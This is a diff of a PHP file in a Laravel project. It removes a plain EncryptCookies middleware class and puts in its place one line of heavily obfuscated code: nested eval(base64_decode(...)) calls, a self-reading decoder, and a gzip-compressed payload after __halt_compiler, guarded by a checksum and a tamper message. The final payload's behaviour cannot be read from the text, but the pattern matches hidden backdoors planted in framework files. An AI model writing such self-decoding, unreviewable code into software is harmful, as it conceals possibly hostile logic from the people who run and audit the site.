@@ -1,17 +1,1 @@
-<?php
-
-namespace SPCVN\Http\Middleware;
-
-use Illuminate\Cookie\Middleware\EncryptCookies as BaseEncrypter;
-
-class EncryptCookies extends BaseEncrypter
-{
-    /**
-     * The names of the cookies that should not be encrypted.
-     *
-     * @var array
-     */
-    protected $except = [
-        'sidebar'
-    ];
-}
+<?php /*  Checksum: 378a4a5e */ eval(base64_decode("JEkxbEkxSWxJSWw9IGZpbGUocHJlZ19yZXBsYWNlKCJAXCguKlwoLiokQCIsIiIsX19GSUxFX18pKTsNCiAgICAgICAgICAgICAgICBpZihwcmVnX3JlcGxhY2UoIkBcKC4qXCguKiRAIiwiIixfX0ZJTEVfXyk9PV9fRklMRV9fIG9yIHByZWdfcmVwbGFjZSgiQFwoLipcKC4qJEAiLCIiLF9fTElORV9fKSA+IDIpZGllKCI8dHQ+TcOgeSBQaMOhICIpOw"));eval(base64_decode("ZnVuY3Rpb24gTzAwME9PME9PMCgkYSwkYil7JGM9YXJyYXkoOTI2LDMzMCw4LDI2OCk7JGs9Z3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoIkt5ck5UY29zS1FZQSIpKTskTzBPMD0ka1s2XS4ka1sxXS4ka1szXS4ka1s2XS4ka1s1XS4ka1swXTskTzA9JGtbNV0uJGtbMF0uJGtbNF0uJGtbMl07aWYoJGI9PTEyMCl7JGQ9JE8wTzAoJGEsJGNbMF0rJGNbMV0sJGNbMl0pO31lbHNlaWYoJGI9PTM2KXskZD0kTzBPMCgkYSwkY1swXSwkY1sxXSk7fWVsc2VpZigkYj09NzkpeyRkPSRPMCgkTzBPMCgkYSwkY1swXSskY1sxXSskY1syXSkpO31yZXR1cm4kZDt9"));eval(base64_decode(O000OO0OO0($I1lI1IlIIl[0],36)));eval(I1Il1l1III(O000OO0OO0($I1lI1IlIIl[0],79),O000OO0OO0($I1lI1IlIIl[0],120),$I1lI1IlIIl));__halt_compiler();nM6zaWYoIWZ1bmN0aW9uX2V4aXN0cygiSTFJbDFsMUlJSSIpKXtmdW5jdGlvbiBJMUlsMWwxSUlJKCRhLCRiLCRjKXskZD1pbXBsb2RlKCRjKTskZD1wcmVnX3JlcGxhY2UoIi9fX2hhbHRfY29tcGlsZXIuKi8iLCIiLCRkKTtpZigkYj09aGFzaCgiY3JjMzIiLCIkZCIpKXtyZXR1cm4oZ3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoJGEpKSk7fWVsc2V7ZGllKCI8dHQ+Y3JjMzIgQ29kZSBtYW5pcHVsYXRpb24gZGV0ZWN0ZWQ8L3R0PiIpO319fQ42952a13XY9BSwNBDIXvA/Mf3kEo7MH+gFIQi6CHloLFi+shnYns4nRmmGS1RfzvDt2tSHN6efnySKyxJtKBJZNjPG9XL5v2UTW36977wF9UeGErMwjjKYTh0EdSblcpffT8D2ofoiunrONAQIJ7Ep5cLucQF0gEVyQflaO/wq35tga15k0zCjTYdYzzrUjv0Nq4KUI7UkiXhuARk2LP4CnJ317W/2LuPqmASqHTxZqPIpek7OoObvjoOCuWeJ2YWjPpPe+pzEbrrb70Y80v
